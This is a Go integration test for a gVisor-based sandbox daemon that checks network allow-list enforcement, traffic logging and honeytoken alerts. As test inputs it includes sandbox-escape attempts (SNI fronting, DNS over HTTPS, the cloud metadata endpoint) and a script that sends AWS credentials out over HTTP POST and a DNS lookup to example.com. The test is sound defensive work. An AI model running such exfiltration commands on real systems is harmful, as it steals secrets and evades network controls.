//go:build linux

package daemon

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/netip"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	qtdv1 "github.com/Frostykiller3m/Quaarant/internal/api/qtd/v1"
	"github.com/Frostykiller3m/Quaarant/internal/backend"
	"github.com/Frostykiller3m/Quaarant/internal/backend/gvisor"
	"github.com/Frostykiller3m/Quaarant/internal/events"
	"github.com/Frostykiller3m/Quaarant/internal/image"
	"github.com/Frostykiller3m/Quaarant/internal/netpol"
)

// TestITestDaemonNetwork drives real qtd + runsc with sandbox networking over the socket:
// --net=allow lets pip install from PyPI and nothing else; --net=log reaches the internet
// and records it; every query, connection and denial is a host event; rm leaves no link.
func TestITestDaemonNetwork(t *testing.T) {
	if os.Getenv("QT_ITEST") != "1" || os.Geteuid() != 0 {
		t.Skip("integration test: QT_ITEST=1 as root, with runsc, nftables and network")
	}
	runsc, err := exec.LookPath("runsc")
	if err != nil {
		t.Skip("runsc not on PATH")
	}
	dir := t.TempDir()
	data := filepath.Join(dir, "data")
	state := filepath.Join(dir, "runsc")
	t.Cleanup(func() { _ = exec.Command("umount", "-l", filepath.Join(state, "null-netns")).Run() })
	agent := filepath.Join(dir, "qt-agent")
	build := exec.Command("go", "build", "-buildvcs=false", "-o", agent, "github.com/Frostykiller3m/Quaarant/cmd/qt-agent")
	build.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build qt-agent: %v\n%s", err, out)
	}
	be, err := gvisor.New(gvisor.Config{Runsc: runsc, StateDir: state, AgentPath: agent, CgroupParent: "/quarantine-itest-daemon-net"})
	if err != nil {
		t.Fatal(err)
	}
	n := rand.IntN(200)
	tag := fmt.Sprintf("d%02x", n)
	nm, err := netpol.New(context.Background(), netpol.Config{
		Tag: tag, Pool: netip.MustParsePrefix(fmt.Sprintf("10.234.%d.0/24", n)),
		ProxyPort: netpol.DefaultProxyPort, DNSPort: netpol.DefaultDNSPort,
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = nm.Close(context.Background()) })
	svc, err := New(Options{DataDir: data, Backends: []backend.Backend{be}, Images: image.NewStore(filepath.Join(data, "images")), Net: nm})
	if err != nil {
		t.Fatal(err)
	}
	sockDir, _ := os.MkdirTemp("", "qtd-net")
	t.Cleanup(func() { _ = os.RemoveAll(sockDir) })
	lis, authz, err := Listen(filepath.Join(sockDir, "qtd.sock"), "quarantine", slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- Serve(ctx, lis, svc, authz) }()
	t.Cleanup(func() {
		cancel()
		if err := <-done; err != nil {
			t.Errorf("serve: %v", err)
		}
	})
	conn, err := grpc.NewClient("unix://"+filepath.Join(sockDir, "qtd.sock"), grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	h := &harness{client: qtdv1.NewSandboxServiceClient(conn), wait: 3 * time.Minute}

	honeytokens := false
	create := func(img string, np *qtdv1.NetPolicy) string {
		t.Helper()
		cctx, ccancel := context.WithTimeout(context.Background(), 5*time.Minute)
		defer ccancel()
		resp, err := h.client.Create(cctx, &qtdv1.CreateRequest{
			Image: img, Net: np, Honeytokens: honeytokens,
			Limits: &qtdv1.Limits{CpuMillis: 1000, MemoryBytes: 512 << 20, Pids: 128},
		})
		if err != nil {
			t.Fatalf("create %s: %v", img, err)
		}
		return resp.GetSandbox().GetId()
	}
	sh := func(id, script string) execResult {
		t.Helper()
		return h.exec(t, start(id, "/bin/sh", "-c", script))
	}

	// --net=allow: pip works; nothing else does.
	allow := create("python:3.13-alpine", &qtdv1.NetPolicy{Mode: qtdv1.NetPolicy_MODE_ALLOW, AllowDomains: []string{"pypi.org", "files.pythonhosted.org"}})
	r := sh(allow, "pip install --no-cache-dir --disable-pip-version-check --target /tmp/pkgs six 2>&1 && PYTHONPATH=/tmp/pkgs python3 -c 'import six; print(\"six\", six.__version__)'")
	if r.err != nil || r.exit.GetCode() != 0 || !strings.Contains(r.stdout, "six 1.") {
		t.Fatalf("pip install with --net=allow:pypi.org,files.pythonhosted.org: %+v", r)
	}
	t.Logf("pip: %s", r.stdout[strings.LastIndex(strings.TrimSpace(r.stdout), "\n")+1:])
	fronting := `python3 -c "
import socket, ssl
ip = socket.gethostbyname('pypi.org')
s = socket.create_connection((ip, 443), 5)
ssl.create_default_context().wrap_socket(s, server_hostname='example.com')
"`
	for name, script := range map[string]string{
		"other name":             "wget -q -T 5 -O /dev/null https://example.com/",
		"direct IP":              "wget -q -T 5 -O /dev/null https://1.1.1.1/",
		"DNS over HTTPS":         "wget -q -T 5 -O /dev/null 'https://cloudflare-dns.com/dns-query?name=example.com&type=A'",
		"SNI fronting":           fronting,
		"metadata":               "wget -q -T 5 -O /dev/null http://169.254.169.254/latest/meta-data/",
		"UDP to a public server": "python3 -c \"import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2); s.sendto(b'x', ('8.8.8.8', 123)); s.recv(1)\"",
	} {
		if r := sh(allow, script); r.err == nil && r.exit.GetCode() == 0 {
			t.Errorf("%s: reachable with an allow-list (%q)", name, r.stdout)
		}
	}
	list, err := h.client.List(context.Background(), &qtdv1.ListRequest{})
	if err != nil || len(list.GetSandboxes()) != 1 || list.GetSandboxes()[0].GetNet().GetMode() != qtdv1.NetPolicy_MODE_ALLOW ||
		strings.Join(list.GetSandboxes()[0].GetNet().GetAllowDomains(), ",") != "pypi.org,files.pythonhosted.org" {
		t.Errorf("list: %v %v", list, err)
	}

	// --net=log: anything public works, and is recorded.
	logged := create("alpine:3.22", &qtdv1.NetPolicy{Mode: qtdv1.NetPolicy_MODE_LOG})
	if r := sh(logged, "wget -q -T 10 -O /dev/null https://example.com/ && echo ok"); r.exit.GetCode() != 0 || r.stdout != "ok\n" {
		t.Errorf("--net=log: %+v", r)
	}
	time.Sleep(500 * time.Millisecond)

	check := func(id string, wants [][]string) {
		t.Helper()
		evs, err := readEvents(t, h, &qtdv1.EventsRequest{SandboxId: id, Kinds: []string{"net", "dns", "policy_denied", "honeytoken"}})
		if err != nil {
			t.Fatal(err)
		}
		var lines []string
		for _, e := range evs {
			lines = append(lines, string(e.GetEventJson()))
		}
		for _, w := range wants {
			found := false
			for _, l := range lines {
				ok := strings.Contains(l, `"source":"host"`)
				for _, s := range w {
					ok = ok && strings.Contains(l, s)
				}
				found = found || ok
			}
			if !found {
				t.Errorf("%s: no host event with %q in:\n%s", id, w, strings.Join(lines, "\n"))
			}
		}
		f, err := os.Open(filepath.Join(data, "sandboxes", id, "events.jsonl"))
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = f.Close() }()
		if err := events.ValidateStream(f, func(events.Event) error { return nil }); err != nil {
			t.Errorf("%s: events.jsonl: %v", id, err)
		}
		t.Logf("%s: %d network events", id, len(lines))
	}
	check(allow, [][]string{
		{`"kind":"dns"`, `"qname":"pypi.org"`, `"allowed":true`},
		{`"kind":"dns"`, `"qname":"files.pythonhosted.org"`, `"allowed":true`},
		{`"kind":"net"`, `"op":"connect"`, `"sni":"pypi.org"`, `"allowed":true`},
		{`"kind":"net"`, `"op":"close"`, `"sni":"files.pythonhosted.org"`, `"bytes_in":`},
		{`"kind":"dns"`, `"qname":"example.com"`, `"allowed":false`},
		{`"kind":"policy_denied"`, `"target":"cloudflare-dns.com"`, `"reason":"not_allowlisted"`},
		{`"kind":"policy_denied"`, `"target":"1.1.1.1:443"`, `"reason":"direct_ip"`},
		{`"kind":"policy_denied"`, `"target":"example.com"`, `"reason":"sni_mismatch"`},
		{`"kind":"policy_denied"`, `"reason":"metadata"`},
		{`"kind":"policy_denied"`, `"target":"8.8.8.8:123"`},
	})
	check(logged, [][]string{
		{`"kind":"dns"`, `"qname":"example.com"`, `"allowed":true`},
		{`"kind":"net"`, `"op":"close"`, `"sni":"example.com"`, `"bytes_in":`, `"duration_ms":`},
	})

	// Honeytokens: planted as the sandbox user, invisible to diff until changed; reading one
	// is an event, sending one anywhere is a red flag.
	honeytokens = true
	honey := create("python:3.13-alpine", &qtdv1.NetPolicy{Mode: qtdv1.NetPolicy_MODE_LOG})
	r = sh(honey, `cd "$HOME"; stat -c '%U %a %n' .ssh/id_ed25519 .aws/credentials .env .config/google-chrome/Default/Cookies
python3 -c "import sqlite3,os; c=sqlite3.connect(os.path.expanduser('~/.config/google-chrome/Default/Cookies')); print(c.execute('select count(*), min(host_key) from cookies').fetchone())"`)
	if r.exit.GetCode() != 0 || strings.Count(r.stdout, "nobody 600 ") != 4 || !strings.Contains(r.stdout, "(2, '.amazon.com')") {
		t.Errorf("planted honeytokens: %+v", r)
	}
	diff, err := h.client.Diff(context.Background(), &qtdv1.DiffRequest{SandboxId: honey})
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range diff.GetChanges() {
		if strings.Contains(c.GetPath(), ".aws") || strings.Contains(c.GetPath(), ".ssh") || strings.HasSuffix(c.GetPath(), "/.env") {
			t.Errorf("diff shows a planted token: %v", c)
		}
	}
	r = sh(honey, `cat ~/.aws/credentials >/dev/null
id=$(awk '/aws_access_key_id/ {print tolower($3)}' ~/.aws/credentials)
wget -q -T 5 -O /dev/null --post-data "c=$(base64 -w0 ~/.aws/credentials)" http://example.com/ 2>/dev/null
nslookup "$id.exfil.example.com" >/dev/null 2>&1
echo leaked >> ~/.env; true`)
	if r.exit.GetCode() != 0 {
		t.Errorf("exfil script: %+v", r)
	}
	time.Sleep(2500 * time.Millisecond) // the gvisor file events flush after 2 s
	check(honey, [][]string{
		{`"kind":"honeytoken"`, `"trigger":"read"`, `"token_kind":"aws_credentials"`, `"related_event":"ev_`},
		{`"kind":"honeytoken"`, `"trigger":"read"`, `"token_kind":"browser_cookies"`},
		{`"kind":"honeytoken"`, `"trigger":"egress_plaintext"`, `"token_kind":"aws_credentials"`, `"dst":"example.com"`},
		{`"kind":"honeytoken"`, `"trigger":"egress_dns"`, `"token_kind":"aws_credentials"`, `.exfil.example.com"`},
	})
	diff, err = h.client.Diff(context.Background(), &qtdv1.DiffRequest{SandboxId: honey})
	if err != nil {
		t.Fatal(err)
	}
	changedEnv := false
	for _, c := range diff.GetChanges() {
		changedEnv = changedEnv || strings.HasSuffix(c.GetPath(), "/.env")
	}
	if !changedEnv {
		t.Errorf("diff hides a modified token: %v", diff.GetChanges())
	}
	if _, err := os.Stat(filepath.Join(data, "sandboxes", honey, "honeytokens.json")); err != nil {
		t.Error(err)
	}

	// rm leaves no link, namespace or proxy behind.
	for _, id := range []string{allow, logged, honey} {
		if _, err := h.client.Destroy(context.Background(), &qtdv1.DestroyRequest{SandboxId: id}); err != nil {
			t.Fatalf("rm %s: %v", id, err)
		}
	}
	links, _ := filepath.Glob("/sys/class/net/" + tag + "n*")
	nss, _ := filepath.Glob("/run/netns/" + tag + "-*")
	if len(links)+len(nss) > 0 {
		t.Errorf("rm left %v %v", links, nss)
	}
	if left, _ := os.ReadDir(filepath.Join(data, "sandboxes")); len(left) != 0 {
		t.Errorf("rm left sandboxes/%v", left)
	}
}
